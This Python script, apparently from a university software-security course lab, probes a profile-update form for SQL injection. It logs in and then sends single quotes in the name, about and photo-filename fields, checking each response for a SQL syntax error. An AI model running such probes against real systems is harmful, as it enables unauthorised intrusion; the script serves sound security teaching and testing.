import fire
import requests


def attack(server: str = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt',
           username: str = 'yoyo',
           password: str = 'yoyo'):

    user = {'username': username, 'password': password}

    s = requests.Session()
    s.post(url=server + '/register', data=user)
    r = s.post(url=server + '/login', data=user)
    if not r.ok:
        raise ValueError(f'Could not login the victim with credentials: {user}')

    print('Trying to insert a wrong value at `name`', end='... ')
    r = s.post(url=server + '/update_profile', files={
        'name': (None, "'"),
        'currentpassword': (None, password),
        'newpassword': (None, ''),
        'about': (None, ''),
        'photo': ('name.jpg', 'val')
    })
    assert 'error in your SQL syntax' in r.text
    print('Success!')

    print('Trying to insert a wrong value at `about`', end='... ')
    r = s.post(url=server + '/update_profile', files={
        'name': (None, ''),
        'currentpassword': (None, password),
        'newpassword': (None, ''),
        'about': (None, "'"),
        'photo': ('name.jpg', 'val')
    })
    assert 'error in your SQL syntax' in r.text
    print('Success!')

    print('Trying to insert a wrong value at `photo`', end='... ')
    r = s.post(url=server + '/update_profile', files={
        'name': (None, ''),
        'currentpassword': (None, password),
        'newpassword': (None, ''),
        'about': (None, ''),
        'photo': ("'", "'")
    })
    assert 'error in your SQL syntax' in r.text
    print('Success!')

    print('Making sure that with normal values everything would be okay', end='... ')
    r = s.post(url=server + '/update_profile', files={
        'name': (None, ''),
        'currentpassword': (None, password),
        'newpassword': (None, ''),
        'about': (None, ''),
        'photo': ('name.jpg', 'val')
    })
    assert 'error in your SQL syntax' not in r.text
    print('Success!')


if __name__ == '__main__':
    fire.Fire(attack)
